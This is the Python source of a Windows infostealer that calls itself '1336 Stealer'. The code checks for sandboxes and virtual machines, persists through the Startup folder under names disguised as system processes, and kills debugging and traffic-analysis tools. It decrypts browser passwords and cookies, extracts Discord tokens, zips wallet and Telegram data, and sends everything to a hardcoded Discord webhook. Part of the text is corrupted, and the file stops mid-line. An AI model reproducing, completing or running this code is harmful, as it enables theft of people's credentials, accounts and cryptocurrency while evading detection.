import os
import threading
from sys import executable
import subprocess
import time
import signal

def handler(signum, frame):
    exit(0)

signal.signal(signal.SIGINT, handler)

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
    ["subprocess", "subprocess"],
    ["re", "re"],
    ["random", "random"],
    ["random", "random"],
    ["zipfile", "zipfile"],
    ["threading", "threading"],
    ["json", "json"],
    ["ctypes", "ctypes"],
    ["base64", "base64"],
    ["ctypes", "ctypes"],
    ["sqlite3", "pysqlite3"],
    ["winreg", "winreg"],
    ["ntpath", "ntpath"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)


from sqlite3 import connect as sql_connect
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import shutil, random
import ntpath
import json
import winreg
import re

bluseurs = [
    "WDAGUtilityAccount", "Robert", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq",
    "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl",
]
blpcname = [
    "DESKTOP-CDLNVOQ", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM",
    "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
    "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
]
blhwid = [
    "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009",
    "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
    "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "79AF5279-16CF-4094-9758-F88A616D81B4",
    "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022",
    "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF",
    "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C",
    "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
    "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
    "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
]

hwid = uuidwndz = subprocess.check_output("wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()

if os.getenv("COMPUTERNAME") in blpcname:
    exit()
if os.getlogin() in bluseurs:
    exit()
if hwid in blhwid:
    exit()

def regkey():
    reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
    reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
    if (reg1 and reg2) != 1:
        exit()
    handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
    try:
        reg_val = winreg.QueryValueEx(handle, '0')[0]
        if ("VMware" or "VBOX") in reg_val:
            exit()
    finally:
        winreg.CloseKey(handle)

class StartUp:
    procces_list = ["WindowsDefenderChecker", "WindowsBinaryX86", 'PCHealthify', 'ProcessUUID', 'YourPhone', 'Registry', 'fontdrvhost', 'gameinputsvc', 'CefSharp.BrowserSubprocess']
    path = str(os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup')
    current_name = None

    def setinstartup():
        for file in os.listdir(StartUp.path):
            if file.replace('.exe', '') in StartUp.procces_list:
                os.remove(StartUp.path+"\\"+file)
        StartUp.current_name = random.choice(StartUp.procces_list)
        shutil.copy(__file__, f'{StartUp.path}\{StartUp.current_name}')
        

    def isinstartup():
        for file in os.listdir(StartUp.path):
            if str(file) == str(StartUp.current_name):
                return True
        return False

try:
    StartUp.setinstartup()
except:
    pass


try:        
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
    class antitrack:
        def fuck(names):
            for proc in process_iter():
                try:
                    for name in names:
                        if name.lower() in proc.name().lower():
                            proc.kill()
                except (NoSuchProcess, AccessDenied, ZombieProcess):
                    pass
        def amongus():
            pl = ['http', 'traffic', 'wireshark', 'fiddler', 'packet', "httpdebuggerui", "vboxservice", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", 'cmd', 'regedit', 'debug']
            return antitrack.fuck(names=pl)   
    antitrack.amongus()
except:
    pass

DETECTED = False
balls = "https://discord.com/api/webhooks/1058120004190609440/qUd48F2bAiShfqwZ6SXJVlTOWZhcON9Wmi2KSOTziIvk2yyavrlI-ztJUvPpbegwOjtg"

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip


import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    globalinfo = f"> **__Username:__** {username.upper()} 〃 **__IP:__** {ip} ({contry} :flag_{contryCode}:)"
    # print(globalinfo)
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED, data
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986ɸ4(4(=ݹ	̀􀜜4(1Ѐl4(9耝ɱ}Yɥ}	}ٕȜYՔȰ耈 tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     r = requests.post(balls, files=files)
#     LoadRequests("POST", hook, files=files)

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"〃  1336 STEALER ON TOP\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global data
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"URL: {row[0]} | USERNAME: {row[1]} | PASSWORD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'password')

Cookies = []    
def getCookie(path, arg):
    global data
    try:

        global Cookies, CookiCount
        if not os.path.exists(path): return
        
        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return
        
        tempfold = temp + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"
        
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data: 
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in cookiWords: cookiWords.append(old)
                Cookies.append(f"{row[0]}\t{'FALSE' if row[4] == 0 else 'TRUE'}\t{row[3]}\t{'FALSE' if str(row[0]).startswith('.') else 'TRUE'}\t{row[4]}\t{row[1]}\t{DecryptValue(row[2], master_key)}")
                CookiCount += 1
        writeforfile(Cookies, 'cookies')
    except:
        pass

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = "<:1336:1035948181994872872> Wallets\n"
        for i in WalletsZip:
            wal += f"〃 [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game: Gaming:\n"
        for i in GamingZip:
            ga += f"〃 [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":mobile_phone: Others\n"
        for i in OtherZip:
            ot += f"〃 [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": f'{globalInfo()} 〃 [@1336ST34ler](https://t.me/st34ler)',
        "embeds": [
            {
            "title": "Thanks for using 1336",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 0,
            "footer": {
                "text": "@1336St34ler",
                "icon_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png"
            }
            }
        ],
        "username": "1336 St34ler",
        "avatar_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png",
        "attachments": []
    }
    LoadUrlib(balls, data=dumps(data).encode(), headers=headers)
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f 
